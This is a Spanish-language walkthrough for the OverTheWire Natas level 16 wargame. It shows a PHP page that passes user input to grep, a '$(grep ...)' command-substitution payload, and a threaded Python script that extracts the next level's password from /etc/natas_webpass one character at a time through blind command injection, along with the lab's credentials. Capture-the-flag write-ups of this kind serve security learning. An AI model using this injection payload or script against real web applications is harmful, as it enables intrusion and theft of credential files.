# Natas 16

#### URL: http://natas16.natas.labs.overthewire.org/
#### Credenciales: natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo

Como en niveles anteriores se ejecuta el comando grep con la entrada del usuario como parametro, pero esta vez se filtran mas caracteres y el parametro esta entre comillas
``` php
if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

Podemos buscar una llamada a grep con un subcomando y concatenarlo a una palabra existente en el diccionario, por ejemplo:

`$(grep ^algo /etc/natas_webpass/natas17)guilty`

esto busca la coincidencia de la contraseña concatenada con "guilty", por lo que no veremos ninguna palabra valida en la salida, en caso contrario nos devolverá "guilty" como resultado.

EL objetivo es ir obteniendo caracter por caracter de la contraseña con esta técnica, similar al nivel anterior de inyeccion SQL a ciegas. En python puede ser como sigue:

```python
# script.py
# Async version 
import requests
import string
import threading
import base64

book = string.ascii_letters + string.digits
passwd = ""
headers = {'Authorization': f'Basic {base64.b64encode(b"natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo").decode()}'}

def test_char(c):
    global found_char
    payload = f"$(grep ^{passwd + c} /etc/natas_webpass/natas17)guilty"
    x = requests.get(f"http://natas16.natas.labs.overthewire.org/index.php?needle={payload}&submit=Search", headers=headers)
    if "guilty" not in x.text:
        found_char=c

print("Starting attack.")
for i in range(32):
    found_char = None
    threads = []
    for c in book:
        thread = threading.Thread(target=test_char,args=(c,))
        threads.append(thread)
        thread.start()
    for t in threads:
        t.join()
    if found_char:
        passwd+=found_char
        print(f"Found {found_char} at position {i+1}")
    else:
        print("Not character found. Invalid payload.")
        break

print(f"Final password: {passwd}")
```

Ejecutando `python3 script.py` obtenemos EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC.

`natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`

